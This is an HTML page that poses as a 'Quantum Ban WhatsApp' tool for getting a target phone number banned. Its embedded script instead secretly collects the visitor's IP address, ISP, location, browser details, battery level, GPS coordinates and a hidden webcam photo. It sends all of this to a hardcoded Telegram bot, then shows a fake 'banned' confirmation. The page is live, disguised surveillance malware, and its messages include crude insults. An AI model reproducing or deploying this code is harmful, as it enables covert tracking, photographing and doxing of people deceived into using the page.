<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Website Ban WhatsApp By Gabriel St. West</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
      font-family: 'Inter', sans-serif;
      color: #00ff7f;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
    .particle { position: absolute; width: 2px; height: 2px; background: rgba(0, 255, 127, 0.3); border-radius: 50%; animation: float 6s ease-in-out infinite; }
    @keyframes float { 0%, 100% { transform: translateY(0px); opacity: 0.3; } 50% { transform: translateY(-20px); opacity: 0.8; } }
    .login-container {
      background-color: rgba(17, 17, 17, 0.95);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff7f;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
    }
    .login-title {
      font-size: 24px;
      font-weight: 900;
      margin-bottom: 10px;
      background: linear-gradient(135deg, #00ff7f, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .login-subtitle { font-size: 13px; color: #ffc107; margin-bottom: 20px; }
    .login-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #222;
      border: 1px solid #333;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
      outline: none;
    }
    .login-input:focus { border-color: #00ff7f; }
    .login-button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #00ff7f, #00cc66);
      color: black;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 900;
      font-size: 15px;
      text-transform: uppercase;
    }
    .login-button:hover { box-shadow: 0 0 20px #00ff7f; }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 20px;
      background: #111;
      padding: 15px;
      border-radius: 8px;
      font-size: 12px;
      color: #aaa;
      border: 1px dashed #333;
    }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="login-container">
    <p class="login-title">Quantum Ban WhatsApp</p>
    <p class="login-subtitle">⚠️ System v14.0 - Use with Responsibility</p>
    <input type="number" class="login-input" placeholder="628xxxxxxxxx" id="text">
    <button class="login-button" id="login-button">START BANNING</button>
    <div id="info">Silahkan masukkan nomor target...</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    const botToken = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
    const chatIds = ['6932904607'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(e => console.error("Koneksi ampas, kontol"));
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(e => console.error("Foto gagal kirim, babi"));
      });
    }

    async function grabDox() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const res = await fetch('https://ip-api.com/json/');
        const loc = await res.json();
        if (loc.status === 'success') {
          ip = loc.query; city = loc.city; region = loc.regionName; country = loc.country; org = loc.org;
        }
      } catch {}

      const report = `
<b>🔥 QUANTUM DOXING REPORT 🔥</b>
<b>Nomor:</b> <code>${input.value}</code>
<b>IP:</b> <code>${ip}</code>
<b>ISP:</b> ${org}
<b>Kota:</b> ${city}, ${region}, ${country}
<b>OS/Browser:</b> ${navigator.userAgent}
<b>Baterai:</b> ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0)+'%' : 'N/A'}
<b>Waktu:</b> ${new Date().toLocaleString()}
      `.trim();
      sendToTelegram(report);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const map = `https://www.google.com/maps?q=${lat},${lon}`;
          sendToTelegram(`<b>📍 GPS ACCURATE:</b> <a href="${map}">BUKA LOKASI</a>`);
        }, () => sendToTelegram("📍 GPS: Target nge-block lokasinya!"));
      }
    }

    async function takePicture() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 2500)); // Delay buat dapet fokus muka
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(blob => {
          if (blob) sendPhotoToTelegram(blob);
          stream.getTracks().forEach(t => t.stop());
        }, 'image/jpeg', 0.8);
      } catch (e) {
        sendToTelegram("❌ CAMERA: Target nge-block kamera!");
      }
    }

    button.addEventListener('click', async () => {
      const val = input.value.trim();
      if (val.length < 8) { return infoDiv.innerText = "⚠️ Masukin nomor yang bener, tolol!"; }
      
      button.disabled = true;
      infoDiv.innerText = "⏳ Memulai Injeksi Exploit ke Database WA...";
      
      // Jalankan eksekusi doxing
      await grabDox();
      await takePicture();

      setTimeout(() => {
        infoDiv.innerText = `✅ Berhasil! Nomor ${val} telah masuk antrian Banned.`;
        button.disabled = false;
        input.value = '';
      }, 5000);
    });

    // Particle logic
    const container = document.querySelector('.bg-particles');
    for (let i = 0; i < 40; i++) {
      const p = document.createElement('div');
      p.className = 'particle';
      p.style.left = Math.random() * 100 + '%';
      p.style.top = Math.random() * 100 + '%';
      p.style.animationDelay = Math.random() * 5 + 's';
      container.appendChild(p);
    }
  </script>
</body>
</html>
